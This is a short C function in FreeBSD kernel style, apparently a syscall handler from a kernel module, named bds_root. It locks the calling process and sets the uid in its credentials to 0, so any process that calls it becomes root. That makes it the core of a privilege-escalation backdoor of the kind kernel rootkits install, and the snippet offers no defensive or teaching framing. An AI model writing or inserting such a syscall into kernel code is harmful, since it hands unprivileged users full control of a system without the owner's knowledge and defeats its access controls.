static int bds_root(struct thread *td, void *syscall_args) {
    struct proc *p;
	
	sx_xlock(&allproc_lock);
  	p = td->td_proc;
 	PROC_LOCK(p);
  	p->p_ucred->cr_uid = 0;
   	PROC_UNLOCK(p);
   	sx_unlock(&allproc_lock);
	
   	return 0;
}
